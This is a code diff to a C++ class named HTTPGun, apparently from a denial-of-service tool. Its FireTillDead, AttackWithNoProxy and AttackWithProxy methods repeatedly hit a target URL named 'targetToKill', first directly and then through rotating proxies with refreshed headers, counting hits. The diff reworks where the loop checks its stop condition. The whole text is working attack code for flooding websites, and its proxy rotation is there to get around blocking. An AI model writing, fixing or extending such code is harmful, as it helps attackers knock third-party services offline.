@@ -73,19 +73,16 @@ bool HTTPGun::SetValidProxy() noexcept
 
 std::size_t HTTPGun::FireTillDead(const CURI &targetToKill) noexcept
 {
-	SPDLOG_INFO("Attacking {} without proxy", targetToKill);
 	std::size_t hits{0};
 
+	SPDLOG_INFO("Attacking {} without proxy", targetToKill);
 	if(AttackWithNoProxy(targetToKill, hits))
 	{
 		return hits;
 	}
 
-	if(!m_currentTask.ShouldStop())
-	{
-		SPDLOG_INFO("Attacking {} with proxy", targetToKill);
-		AttackWithProxy(targetToKill, hits);
-	}
+	SPDLOG_INFO("Attacking {} with proxy", targetToKill);
+	AttackWithProxy(targetToKill, hits);
 
 	return hits;
 }
@@ -106,11 +103,8 @@ bool HTTPGun::AttackWithNoProxy(const CURI &targetToKill, std::size_t &hitsCount
 
 		if(const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)})
 		{
-			if(m_currentTask.ShouldStop())
-			{
-				break;
-			}
-			if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
+			if(!respCode &&
+				++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
 			{
 				SPDLOG_WARN("Too many errors emited on no proxy attack, retrying");
 				return true;
@@ -153,18 +147,16 @@ void HTTPGun::AttackWithProxy(const CURI &targetToKill, std::size_t &hitsCount) 
 
 		// Attacking
 		size_t errorsCount{0};
-		for(size_t currentTry = 0; 
-			currentTry < ProxyConfig::MAX_PROXY_ATTACKS; currentTry++)
+		size_t currentTry{0}; 
+		while(currentTry++ < ProxyConfig::MAX_PROXY_ATTACKS &&
+			!m_currentTask.ShouldStop())
 		{
 			UpdateHeaders(headers, m_currentProxy->first);
 			wrapper.SetHeaders(headers);
 
 			const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)};
-			if(m_currentTask.ShouldStop())
-			{
-				return;
-			}
-			else if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
+			if(!respCode &&
+				++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
 			{
 				SPDLOG_INFO("Too many errors emited on proxy attack, trying other");
 				return;
